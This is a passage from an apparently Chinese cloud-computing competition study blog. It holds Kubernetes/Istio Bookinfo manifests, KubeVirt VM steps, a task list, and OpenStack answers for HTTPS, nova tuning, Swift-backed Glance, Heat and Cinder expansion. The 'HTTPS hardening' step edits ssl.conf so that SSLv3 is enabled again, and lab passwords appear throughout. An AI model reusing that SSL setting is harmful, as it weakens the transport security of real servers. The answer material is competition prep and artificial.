/tmp</span><br><span class="line">        - name: wlp-output</span><br><span class="line">          mountPath: /opt/ibm/wlp/output</span><br><span class="line">        securityContext:</span><br><span class="line">          runAsUser: 1000</span><br><span class="line">      volumes:</span><br><span class="line">      - name: wlp-output</span><br><span class="line">        emptyDir: &#123;&#125;</span><br><span class="line">      - name: tmp</span><br><span class="line">        emptyDir: &#123;&#125;</span><br><span class="line">---</span><br><span class="line">apiVersion: apps/v1</span><br><span class="line">kind: Deployment</span><br><span class="line">metadata:</span><br><span class="line">  name: reviews-v2</span><br><span class="line">  labels:</span><br><span class="line">    app: reviews</span><br><span class="line">    version: v2</span><br><span class="line">spec:</span><br><span class="line">  replicas: 1</span><br><span class="line">  selector:</span><br><span class="line">    matchLabels:</span><br><span class="line">      app: reviews</span><br><span class="line">      version: v2</span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      labels:</span><br><span class="line">        app: reviews</span><br><span class="line">        version: v2</span><br><span class="line">    spec:</span><br><span class="line">      serviceAccountName: bookinfo-reviews</span><br><span class="line">      containers:</span><br><span class="line">      - name: reviews</span><br><span class="line">        image: docker.io/istio/examples-bookinfo-reviews-v2:1.16.2</span><br><span class="line">        imagePullPolicy: IfNotPresent</span><br><span class="line">        env:</span><br><span class="line">        - name: LOG_DIR</span><br><span class="line">          value: &quot;/tmp/logs&quot;</span><br><span class="line">        ports:</span><br><span class="line">        - containerPort: 9080</span><br><span class="line">        volumeMounts:</span><br><span class="line">        - name: tmp</span><br><span class="line">          mountPath: /tmp</span><br><span class="line">        - name: wlp-output</span><br><span class="line">          mountPath: /opt/ibm/wlp/output</span><br><span class="line">        securityContext:</span><br><span class="line">          runAsUser: 1000</span><br><span class="line">      volumes:</span><br><span class="line">      - name: wlp-output</span><br><span class="line">        emptyDir: &#123;&#125;</span><br><span class="line">      - name: tmp</span><br><span class="line">        emptyDir: &#123;&#125;</span><br><span class="line">---</span><br><span class="line">apiVersion: apps/v1</span><br><span class="line">kind: Deployment</span><br><span class="line">metadata:</span><br><span class="line">  name: reviews-v3</span><br><span class="line">  labels:</span><br><span class="line">    app: reviews</span><br><span class="line">    version: v3</span><br><span class="line">spec:</span><br><span class="line">  replicas: 1</span><br><span class="line">  selector:</span><br><span class="line">    matchLabels:</span><br><span class="line">      app: reviews</span><br><span class="line">      version: v3</span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      labels:</span><br><span class="line">        app: reviews</span><br><span class="line">        version: v3</span><br><span class="line">    spec:</span><br><span class="line">      serviceAccountName: bookinfo-reviews</span><br><span class="line">      containers:</span><br><span class="line">      - name: reviews</span><br><span class="line">        image: docker.io/istio/examples-bookinfo-reviews-v3:1.16.2</span><br><span class="line">        imagePullPolicy: IfNotPresent</span><br><span class="line">        env:</span><br><span class="line">        - name: LOG_DIR</span><br><span class="line">          value: &quot;/tmp/logs&quot;</span><br><span class="line">        ports:</span><br><span class="line">        - containerPort: 9080</span><br><span class="line">        volumeMounts:</span><br><span class="line">        - name: tmp</span><br><span class="line">          mountPath: /tmp</span><br><span class="line">        - name: wlp-output</span><br><span class="line">          mountPath: /opt/ibm/wlp/output</span><br><span class="line">        securityContext:</span><br><span class="line">          runAsUser: 1000</span><br><span class="line">      volumes:</span><br><span class="line">      - name: wlp-output</span><br><span class="line">        emptyDir: &#123;&#125;</span><br><span class="line">      - name: tmp</span><br><span class="line">        emptyDir: &#123;&#125;</span><br><span class="line">---</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#################################################################################################</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Productpage services</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#################################################################################################</span></span></span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: Service</span><br><span class="line">metadata:</span><br><span class="line">  name: productpage</span><br><span class="line">  labels:</span><br><span class="line">    app: productpage</span><br><span class="line">    service: productpage</span><br><span class="line">spec:</span><br><span class="line">  ports:</span><br><span class="line">  - port: 9080</span><br><span class="line">    name: http</span><br><span class="line">  selector:</span><br><span class="line">    app: productpage</span><br><span class="line">---</span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: ServiceAccount</span><br><span class="line">metadata:</span><br><span class="line">  name: bookinfo-productpage</span><br><span class="line">  labels:</span><br><span class="line">    account: productpage</span><br><span class="line">---</span><br><span class="line">apiVersion: apps/v1</span><br><span class="line">kind: Deployment</span><br><span class="line">metadata:</span><br><span class="line">  name: productpage-v1</span><br><span class="line">  labels:</span><br><span class="line">    app: productpage</span><br><span class="line">    version: v1</span><br><span class="line">spec:</span><br><span class="line">  replicas: 1</span><br><span class="line">  selector:</span><br><span class="line">    matchLabels:</span><br><span class="line">      app: productpage</span><br><span class="line">      version: v1</span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      labels:</span><br><span class="line">        app: productpage</span><br><span class="line">        version: v1</span><br><span class="line">    spec:</span><br><span class="line">      serviceAccountName: bookinfo-productpage</span><br><span class="line">      containers:</span><br><span class="line">      - name: productpage</span><br><span class="line">        image: docker.io/istio/examples-bookinfo-productpage-v1:1.16.2</span><br><span class="line">        imagePullPolicy: IfNotPresent</span><br><span class="line">        ports:</span><br><span class="line">        - containerPort: 9080</span><br><span class="line">        volumeMounts:</span><br><span class="line">        - name: tmp</span><br><span class="line">          mountPath: /tmp</span><br><span class="line">        securityContext:</span><br><span class="line">          runAsUser: 1000</span><br><span class="line">      volumes:</span><br><span class="line">      - name: tmp</span><br><span class="line">        emptyDir: &#123;&#125;</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">部署svc</span><br><span class="line">[root@k8s-master-node1 networking]# cat bookinfo-gateway.yaml</span><br><span class="line">apiVersion: networking.istio.io/v1alpha3</span><br><span class="line">kind: Gateway</span><br><span class="line">metadata:</span><br><span class="line">  name: bookinfo-gateway</span><br><span class="line">spec:</span><br><span class="line">  selector:</span><br><span class="line">    istio: ingressgateway # use istio default controller</span><br><span class="line">  servers:</span><br><span class="line">  - port:</span><br><span class="line">      number: 80</span><br><span class="line">      name: http</span><br><span class="line">      protocol: HTTP</span><br><span class="line">    hosts:</span><br><span class="line">    - &quot;*&quot;</span><br><span class="line">---</span><br><span class="line">apiVersion: networking.istio.io/v1alpha3</span><br><span class="line">kind: VirtualService</span><br><span class="line">metadata:</span><br><span class="line">  name: bookinfo</span><br><span class="line">spec:</span><br><span class="line">  hosts:</span><br><span class="line">  - &quot;*&quot;</span><br><span class="line">  gateways:</span><br><span class="line">  - bookinfo-gateway</span><br><span class="line">  http:</span><br><span class="line">  - match:</span><br><span class="line">    - uri:</span><br><span class="line">        exact: /productpage</span><br><span class="line">    - uri:</span><br><span class="line">        prefix: /static</span><br><span class="line">    - uri:</span><br><span class="line">        exact: /login</span><br><span class="line">    - uri:</span><br><span class="line">        exact: /logout</span><br><span class="line">    - uri:</span><br><span class="line">        prefix: /api/v1/products</span><br><span class="line">    route:</span><br><span class="line">    - destination:</span><br><span class="line">        host: productpage</span><br><span class="line">        port:</span><br><span class="line">          number: 9080</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>2.2.11 KubeVirt运维：创建VM</p>
<p>使用提供的镜像在default命名空间下创建一台VM，名称为exam，指定VM的内存、CPU、网卡和磁盘等配置。</p>
<blockquote>
<p>在使用vmware虚拟机时,需要开启vmware虚拟化</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">服务启动完成后启动这个命令</span></span><br><span class="line">[root@master ~]# kubectl -n kubevirt wait kv kubevirt --for condition=Available</span><br><span class="line">kubevirt.kubevirt.io/kubevirt condition met</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@k8s-master-node1 vm]# cat virtual.yaml</span><br><span class="line">apiVersion: kubevirt.io/v1</span><br><span class="line">kind: VirtualMachine</span><br><span class="line">metadata:</span><br><span class="line">  name: exam</span><br><span class="line">spec:</span><br><span class="line">  running: false</span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      labels:</span><br><span class="line">        kubevirt.io/size: small</span><br><span class="line">        kubevirt.io/domain: exam</span><br><span class="line">    spec:</span><br><span class="line">      domain:</span><br><span class="line">        devices:</span><br><span class="line">          disks:</span><br><span class="line">            - name: containerdisk</span><br><span class="line">              disk:</span><br><span class="line">                bus: virtio</span><br><span class="line">            - name: cloudinitdisk</span><br><span class="line">              disk:</span><br><span class="line">                bus: virtio</span><br><span class="line">          interfaces:</span><br><span class="line">          - name: default</span><br><span class="line">            masquerade: &#123;&#125;</span><br><span class="line">        resources:</span><br><span class="line">          requests:</span><br><span class="line">            memory: 64M</span><br><span class="line">      networks:</span><br><span class="line">      - name: default</span><br><span class="line">        pod: &#123;&#125;</span><br><span class="line">      volumes:</span><br><span class="line">        - name: containerdisk</span><br><span class="line">          containerDisk:</span><br><span class="line">            image: quay.io/kubevirt/cirros-container-disk-demo</span><br><span class="line">        - name: cloudinitdisk</span><br><span class="line">          cloudInitNoCloud:</span><br><span class="line">            userDataBase64: SGkuXG4=</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@master kubevirt]# kubectl apply -f virtual.yaml</span><br><span class="line">virtualmachine.kubevirt.io/exam created</span><br><span class="line"></span><br><span class="line">[root@master kubevirt]# kubectl get vm</span><br><span class="line">NAME        AGE   VOLUME</span><br><span class="line">exam	   21m</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用方法</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">启动实例</span></span><br><span class="line">[root@master kubevirt]# virtctl start exam</span><br><span class="line">VM exam was scheduled to start</span><br><span class="line"></span><br><span class="line">[root@master kubevirt]# kubectl get vmi</span><br><span class="line">NAME        AGE   PHASE     IP            NODENAME</span><br><span class="line">exam   62s   Running   10.244.0.15   master</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入虚拟机</span></span><br><span class="line">[root@master kubevirt]# virtctl console exam </span><br><span class="line">Successfully connected to vm-cirros console. The escape sequence is ^]</span><br><span class="line"></span><br><span class="line">login as &#x27;cirros&#x27; user. default password: &#x27;gocubsgo&#x27;. use &#x27;sudo&#x27; for root.</span><br><span class="line">vm-cirros login: cirros</span><br><span class="line">Password:</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ip a</span></span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue qlen 1</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1450 qdisc pfifo_fast qlen 1000</span><br><span class="line">    link/ether 2e:3e:2a:46:29:94 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 10.244.0.16/24 brd 10.244.0.255 scope global eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::2c3e:2aff:fe46:2994/64 scope link tentative flags 08</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">       </span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">   <span class="comment">#  按 ctrl+]  退出虚拟机</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">启动和停止命令</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># Start the virtual machine:  启动虚拟机</span></span></span><br><span class="line">virtctl start vm   </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># Stop the virtual machine:  停止虚拟机</span></span></span><br><span class="line">virtctl stop vm</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">vm作为服务公开 VirtualMachine可以作为服务公开。实际服务将在 VirtualMachineInstance 启动后可用。</span></span><br><span class="line">[root@master kubevirt]# virtctl expose virtualmachine  exam --name vmiservice-node  --target-port 22  --port 24 --type NodePort</span><br><span class="line">Service vmiservice-node successfully exposed for virtualmachine vm-cirros</span><br><span class="line">[root@master kubevirt]# kubectl get svc</span><br><span class="line">NAME              TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)        AGE</span><br><span class="line">kubernetes        ClusterIP   10.96.0.1       &lt;none&gt;        443/TCP        95d</span><br><span class="line">vmiservice-node   NodePort    10.106.62.191   &lt;none&gt;        24:31912/TCP   3s</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p>2.2.12 完成容器云平台的调优或排错工作。（本任务只公布考试范围，不公布赛题）</p>
<h3 id="任务3-容器云运维开发（10分）"><a href="#任务3-容器云运维开发（10分）" class="headerlink" title="任务3 容器云运维开发（10分）"></a>任务3 容器云运维开发（10分）</h3><p>2.3.1 管理job服务</p>
<p>Kubernetes Python运维脚本开发-使用SDK方式管理job服务。</p>
<p>2.3.2 自定义调度器</p>
<p>Kubernetes Python运维脚本开发-使用Restful API方式管理调度器。</p>
<p>2.3.3 编写Kubernetes容器云平台自动化运维工具。（本任务只公布考试范围，不公布赛题）</p>
<h2 id="模块三-公有云（40分）"><a href="#模块三-公有云（40分）" class="headerlink" title="模块三 公有云（40分）"></a>模块三 公有云（40分）</h2><p>企业选择国内公有云提供商，选择云主机、云网络、云硬盘、云防火墙、负载均衡等服务，可创建Web服务，共享文件存储服务，数据库服务，数据库集群等服务。搭建基于云原生的DevOps相关服务，构建云、边、端一体化的边缘计算系统，并开发云应用程序。</p>
<p>根据上述公有云平台的特性，完成公有云中的各项运维工作。</p>
<h3 id="任务1-公有云服务搭建（5分）"><a href="#任务1-公有云服务搭建（5分）" class="headerlink" title="*任务1 公有云服务搭建（5分）*"></a><em><strong>*任务1 公有云服务搭建（5分）*</strong></em></h3><p>3.1.1 私有网络管理</p>
<p>在公有云中完成虚拟私有云网络的创建。</p>
<p>3.1.2 云实例管理</p>
<p>登录公有云平台，创建两台云实例虚拟机。</p>
<p>3.1.3 管理数据库</p>
<p>使用intnetX-mysql网络创建两台chinaskill-sql-1和chinaskill-sql-2云服务器，并完成MongoDB安装。</p>
<p>3.1.4 主从数据库</p>
<p>在chinaskill-sql-1和chinaskill-sql-2云服务器中配置MongoDB主从数据库。</p>
<p>3.1.5 node环境管理</p>
<p>使用提供的压缩文件，安装Node.js环境。</p>
<p>3.1.6 安全组管理</p>
<p>根据要求，创建一个安全组。</p>
<p>3.1.7 RocketChat上云</p>
<p>使用http服务器提供文件，将Rocket.Chat应用部署上云。</p>
<p>3.1.8 NAT网关</p>
<p>根据要求创建一个公网NAT网关。</p>
<p>3.1.9云服务器备份</p>
<p>创建一个云服务器备份存储库名为server_backup，容量为100G。将ChinaSkill-node-1云服务器制作镜像文件chinaskill-image。</p>
<p>3.1.10 负载均衡器</p>
<p>根据要求创建一个负载均衡器chinaskill-elb。</p>
<p>3.1.11 弹性伸缩管理</p>
<p>根据要求新建一个弹性伸缩启动配置。</p>
<h3 id="任务2-公有云服务运维（10分）"><a href="#任务2-公有云服务运维（10分）" class="headerlink" title="*任务2 公有云服务运维（10分）*"></a><em><strong>*任务2 公有云服务运维（10分）*</strong></em></h3><p>3.2.1 云容器引擎</p>
<p>在公有云上，按照要求创建一个x86架构的容器云集群。</p>
<p>3.2.2 云容器管理</p>
<p>使用插件管理在kcloud容器集群中安装Dashboard可视化监控界面。</p>
<p>3.2.3 使用kubectl操作集群</p>
<p>在kcloud集群中安装kubectl命令，使用kubectl命令管理kcloud集群。</p>
<p>3.2.4 安装Helm</p>
<p>使用提供的Helm软件包，在kcloud集群中安装Helm服务。</p>
<p>3.2.5 根据提供的chart包mariadb-7.3.14.tgz部署mariadb服务，修改mariadb使用NodePort模式对其进行访问。</p>
<p>3.2.6 在k8s集群中创建mariadb命名空间，根据提供的chart包mariadb-7.3.14.tgz修改其配置，使用NodePort模式对其进行访问。</p>
<h3 id="任务3-公有云运维开发（10分）"><a href="#任务3-公有云运维开发（10分）" class="headerlink" title="任务3 公有云运维开发（10分）"></a><strong>任务3 公有云运维开发（10分）</strong></h3><p>3.3.1 开发环境搭建</p>
<p>创建一台云主机，并登录此云服务器，安装Python3.68运行环境与SDK依赖库。</p>
<p>3.3.2 安全组管理</p>
<p>调用api安全组的接口，实现安全组的增删查改。</p>
<p>3.3.3 安全组规则管理</p>
<p>调用SDK安全组规则的方法，实现安全组规则的增删查改。</p>
<p>3.3.4 云主机管理</p>
<p>调用SDK云主机管理的方法，实现云主机的的增删查改。</p>
<p>3.3.5 完成公有云平台自动化运维程序开发。（本任务只公布考试范围，不公布赛题）</p>
<h3 id="任务4-边缘计算系统运维（10分）"><a href="#任务4-边缘计算系统运维（10分）" class="headerlink" title="*任务4 边缘计算系统运维（10分）*"></a><em><strong>*任务4 边缘计算系统运维（10分）*</strong></em></h3><p>3.4.1 云端部署</p>
<p>构建Kubernetes容器云平台，云端部署KubeEdge CloudCore云测模块，并启动cloudcore服务。</p>
<p>3.4.2 边端部署</p>
<p>在边侧部署KubeEdge EdgeCore边侧模块，并启动edgecore服务。</p>
<p>3.4.3 边缘应用部署</p>
<p>通过边缘计算平台完成应用场景镜像部署与调试。（本任务只公布考试范围，不公布赛题）</p>
<h3 id="任务5-边缘计算云应用开发（5分）"><a href="#任务5-边缘计算云应用开发（5分）" class="headerlink" title="*任务5 边缘计算云应用开发（5分）*"></a><em><strong>*任务5 边缘计算云应用开发（5分）*</strong></em></h3><p>3.5.1 对接边缘计算系统，完成云应用微服务开发。（本任务只公布考试范围，不公布赛题） </p>
]]></content>
      <categories>
        <category>云计算</category>
        <category>技能大赛汇总</category>
      </categories>
      <tags>
        <tag>云计算</tag>
        <tag>云计算职业技能大赛</tag>
      </tags>
  </entry>
  <entry>
    <title>云计算方向-2022年云计算技能国赛私有云套题</title>
    <url>/posts/2c8237f4.html</url>
    <content><![CDATA[<h1 id="第一套"><a href="#第一套" class="headerlink" title="第一套"></a>第一套</h1><h2 id="私有云运维任务："><a href="#私有云运维任务：" class="headerlink" title="私有云运维任务："></a>私有云运维任务：</h2><h3 id="题目3-OpenStack云平台运维（10分）"><a href="#题目3-OpenStack云平台运维（10分）" class="headerlink" title="题目3. OpenStack云平台运维（10分）"></a>题目3. OpenStack云平台运维（10分）</h3><h4 id="1-使用提供的云安全框架组件，将提供的OpenStack云平台的安全策略从http优化至https。"><a href="#1-使用提供的云安全框架组件，将提供的OpenStack云平台的安全策略从http优化至https。" class="headerlink" title="1.使用提供的云安全框架组件，将提供的OpenStack云平台的安全策略从http优化至https。"></a>1.使用提供的云安全框架组件，将提供的OpenStack云平台的安全策略从http优化至https。</h4><p><strong>可能会遇到 mod_ssl 安装不成功的问题，原因是mod_ssl版本不匹配，上传mod_ssl-2.4.6-97.el7.centos.x86_64.rpm</strong></p>
<p>①安装工具包</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">yum install <span class="literal">-y</span> mod_wsgi httpd mod_ssl</span><br></pre></td></tr></table></figure>

<p>②修改&#x2F;etc&#x2F;openstack-dashboard&#x2F;local_settings文件</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vi /etc/openstack-dashboard/local_settings</span><br><span class="line"><span class="comment">##在DEBUG = False下增加4行</span></span><br><span class="line">USE_SSL = True</span><br><span class="line">CSRF_COOKIE_SECURE = True		<span class="comment">##原文中有，去掉注释即可</span></span><br><span class="line">SESSION_COOKIE_SECURE = True		<span class="comment">##原文中有，去掉注释即可</span></span><br><span class="line">SESSION_COOKIE_HTTPONLY = True</span><br></pre></td></tr></table></figure>

<p>③修改&#x2F;etc&#x2F;httpd&#x2F;conf.d&#x2F;ssl.conf配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi /etc/httpd/conf.d/ssl.conf</span><br><span class="line">##将SSLProtocol all -SSLv2 -SSLv3改成：</span><br><span class="line">SSLProtocol all -SSLv2</span><br></pre></td></tr></table></figure>

<p>④重启服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart httpd</span><br><span class="line">systemctl restart memcached</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>访问Web</li>
</ol>
<h4 id="2-在提供的OpenStack平台上，通过修改相关参数对openstack平台进行调优操作，相应的调优操作有："><a href="#2-在提供的OpenStack平台上，通过修改相关参数对openstack平台进行调优操作，相应的调优操作有：" class="headerlink" title="2.在提供的OpenStack平台上，通过修改相关参数对openstack平台进行调优操作，相应的调优操作有："></a>2.在提供的OpenStack平台上，通过修改相关参数对openstack平台进行调优操作，相应的调优操作有：</h4><p>（1）设置内存超售比例为1.5倍；</p>
<p>（2）设置nova服务心跳检查时间为120秒。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vi /etc/nova/nova.conf</span><br><span class="line">ram_allocation_ratio = 1.5</span><br><span class="line">service_down_time = 120</span><br></pre></td></tr></table></figure>

<h4 id="3-在提供的OpenStack平台上，使用Swift对象存储服务，修改相应的配置文件，使对象存储Swift作为glance镜像服务的后端存储。"><a href="#3-在提供的OpenStack平台上，使用Swift对象存储服务，修改相应的配置文件，使对象存储Swift作为glance镜像服务的后端存储。" class="headerlink" title="3.在提供的OpenStack平台上，使用Swift对象存储服务，修改相应的配置文件，使对象存储Swift作为glance镜像服务的后端存储。"></a>3.在提供的OpenStack平台上，使用Swift对象存储服务，修改相应的配置文件，使对象存储Swift作为glance镜像服务的后端存储。</h4><p>①修改配置文件</p>
<p>vi &#x2F;etc&#x2F;glance&#x2F;glance-api.conf</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[glance_store]</span><br><span class="line">stores=glance.store.filesystem.Store,glance.store.swift.Store,glance.store.http.Store</span><br><span class="line">default_store=swift</span><br><span class="line">swift_store_region=RegionOne</span><br><span class="line">swift_store_endpoint_type=internalURL</span><br><span class="line">swift_store_container=glance</span><br><span class="line">swift_store_large_object_size=5120</span><br><span class="line">swift_store_large_object_chunk_size=200</span><br><span class="line">swift_store_create_container_on_put=True</span><br><span class="line">swift_store_multi_tenant=True</span><br><span class="line">swift_store_admin_tenants=service</span><br><span class="line">swift_store_auth_address=http://controller:5000/v3</span><br><span class="line">swift_store_user=glance</span><br><span class="line">swift_store_key=000000</span><br></pre></td></tr></table></figure>

<p>重启 <strong>glance</strong> 所有组件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart openstack-glance-*</span><br></pre></td></tr></table></figure>

<h4 id="4-在提供的OpenStack平台上，编写heat模板createvm-yml文件，模板作用为按照要求创建一个云主机。"><a href="#4-在提供的OpenStack平台上，编写heat模板createvm-yml文件，模板作用为按照要求创建一个云主机。" class="headerlink" title="4.在提供的OpenStack平台上，编写heat模板createvm.yml文件，模板作用为按照要求创建一个云主机。"></a>4.在提供的OpenStack平台上，编写heat模板createvm.yml文件，模板作用为按照要求创建一个云主机。</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> cat createvm.yml</span><br><span class="line">heat_template_version: 2018-08-31</span><br><span class="line">resources:</span><br><span class="line">  server1:</span><br><span class="line">    type: OS::Nova::Server</span><br><span class="line">    properties:</span><br><span class="line">      name: mytest1</span><br><span class="line">      image: &quot;centos7.5&quot;</span><br><span class="line">      flavor: &quot;small&quot;</span><br><span class="line">      networks:</span><br><span class="line">        - network: &quot;intnet&quot;</span><br><span class="line"></span><br><span class="line">outputs:</span><br><span class="line">  server_names:</span><br><span class="line">    value: &#123; get_attr: [ server1 , name ] &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">openstack stack create -t createvm.yml vm</span><br></pre></td></tr></table></figure>

<h4 id="5-在提供的OpenStack平台上，对cinder存储空间进行扩容操作，要求将cinder存储空间扩容10G。"><a href="#5-在提供的OpenStack平台上，对cinder存储空间进行扩容操作，要求将cinder存储空间扩容10G。" class="headerlink" title="5.在提供的OpenStack平台上，对cinder存储空间进行扩容操作，要求将cinder存储空间扩容10G。"></a>5.在提供的OpenStack平台上，对cinder存储空间进行扩容操作，要求将cinder存储空间扩容10G。</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@compute ~]# lsblk</span><br><span class="line">NAME                                            MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT</span><br><span class="line">sda                                               8:0    0  200G  0 disk</span><br><span class="line">├─sda1                                            8:1    0    1G  0 part /boot</span><br><span class="line">└─sda2                                            8:2    0   19G  0 part</span><br><span class="line">  ├─centos-root                                 253:0    0   17G  0 lvm  /</span><br><span class="line">  └─centos-swap                                 253:1    0    2G  0 lvm  [SWAP]</span><br><span class="line">sdb                                               8:16   0   50G  0 disk</span><br><span class="line">├─sdb1                                            8:17   0   10G  0 part</span><br><span class="line">│ ├─cinder--volumes-cinder--volumes--pool_tmeta 253:2    0   12M  0 lvm</span><br><span class="line">│ │ └─cinder--volumes-cinder--volumes--pool     253:4    0  9.5G  0 lvm</span><br><span class="line">│ └─cinder--volumes-cinder--volumes--pool_tdata 253:3    0  9.5G  0 lvm</span><br><span class="line">│   └─cinder--volumes-cinder--volumes--pool     253:4    0  9.5G  0 lvm</span><br><span class="line">├─sdb2                                            8:18   0   10G  0 part /swift/node/sdb2</span><br><span class="line">├─sdb3                                            8:19   0   10G  0 part</span><br><span class="line">└─sdb4                                            8:20   0    5G  0 part</span><br><span class="line">sr0                                              11:0    1  4.4G  0 rom</span><br><span class="line">[root@compute ~]#</span><br><span class="line">[root@compute ~]# vgdisplay</span><br><span class="line">  --- Volume group ---</span><br><span class="line">  VG Name               cinder-volumes</span><br><span class="line">  System ID</span><br><span class="line">  Format                lvm2</span><br><span class="line">  Metadata Areas        1</span><br><span class="line">  Metadata Sequence No  4</span><br><span class="line">  VG Access             read/write</span><br><span class="line">  VG Status             resizable</span><br><span class="line">  MAX LV                0</span><br><span class="line">  Cur LV                1</span><br><span class="line">  Open LV               0</span><br><span class="line">  Max PV                0</span><br><span class="line">  Cur PV                1</span><br><span class="line">  Act PV                1</span><br><span class="line">  VG Size               &lt;10.00 GiB</span><br><span class="line">  PE Size               4.00 MiB</span><br><span class="line">  Total PE              2559</span><br><span class="line">  Alloc PE / Size       2438 / 9.52 GiB</span><br><span class="line">  Free  PE / Size       121 / 484.00 MiB</span><br><span class="line">  VG UUID               3k0yKg-iQB2-b2CM-a0z2-2ddJ-cdG3-8WpyrG</span><br><span class="line"></span><br><span class="line">  --- Volume group ---</span><br><span class="line">  VG Name               centos</span><br><span class="line">  System ID</span><br><span class="line">  Format                lvm2</span><br><span class="line">  Metadata Areas        1</span><br><span class="line">  Metadata Sequence No  3</span><br><span class="line">  VG Access             read/write</span><br><span class="line">  VG Status             resizable</span><br><span class="line">  MAX LV                0</span><br><span class="line">  Cur LV                2</span><br><span class="line">  Open LV               2</span><br><span class="line">  Max PV                0</span><br><span class="line">  Cur PV                1</span><br><span class="line">  Act PV                1</span><br><span class="line">  VG Size               &lt;19.00 GiB</span><br><span class="line">  PE Size               4.00 MiB</span><br><span class="line">  Total PE              4863</span><br><span class="line">  Alloc PE / Size       4863 / &lt;19.00 GiB</span><br><span class="line">  Free  PE / Size       0 / 0</span><br><span class="line">  VG UUID               acAXNK-eqKm-qs9b-ly3T-R3Sh-8qyv-nELNWv</span><br><span class="line">  [root@compute ~]# vgextend cinder-volumes /dev/sdb4</span><br><span class="line">  Volume group &quot;cinder-volumes&quot; successfully extended</span><br><span class="line">[root@compute ~]# vgdisplay</span><br><span class="line">  --- Volume group ---</span><br><span class="line">  VG Name               cinder-volumes</span><br><span class="line">  System ID</span><br><span class="line">  Format                lvm2</span><br><span class="line">  Metadata Areas        2</span><br><span class="line">  Metadata Sequence No  5</span><br><span class="line">  VG Access             read/write</span><br><span class="line">  VG Status             resizable</span><br><span class="line">  MAX LV                0</span><br><span class="line">  Cur LV                1</span><br><span class="line">  Open LV               0</span><br><span class="line">  Max PV                0</span><br><span class="line">  Cur PV                2</span><br><span class="line">  Act PV                2</span><br><span class="line">  VG Size               14.99 GiB</span><br><span class="line">  PE Size               4.00 MiB</span><br><span class="line">  Total PE              3838</span><br><span class="line">  Alloc PE / Size       2438 / 9.52 GiB</span><br><span class="line">  Free  PE / Size       1400 / &lt;5.47 GiB</span><br><span class="line">  VG UUID               3k0yKg-iQB2-b2CM-a0z2-2ddJ-cdG3-8WpyrG</span><br><span class="line"></span><br><span class="line">  --- Volume group ---</span><br><span class="line">  VG Name               centos</span><br><span class="line">  System ID</span><br><span class="line">  Format                lvm2</span><br><span class="line">  Metadata Areas        1</span><br><span class="line">  Metadata Sequence No  3</span><br><span class="line">  VG Access             read/write</span><br><span class="line">  VG Status             resizable</span><br><span class="line">  MAX LV                0</span><br><span class="line">  Cur LV                2</span><br><span class="line">  Open LV               2</span><br><span class="line">  Max PV                0</span><br><span class="line">  Cur PV                1</span><br><span class="line">  Act PV                1</span><br><span class="line">  VG Size               &lt;19.00 GiB</span><br><span class="line">  PE Size               4.00 MiB</span><br><span class="line">  Total PE              4863</span><br><span class="line">  Alloc PE / Size       4863 / &lt;19.00 GiB</span><br><span class="line">  Free  PE / Size       0 / 0</span><br><span class="line">  VG UUID               acAXNK-eqKm-qs9b-ly3T-R3Sh-8qyv-nELNWv</span><br><span 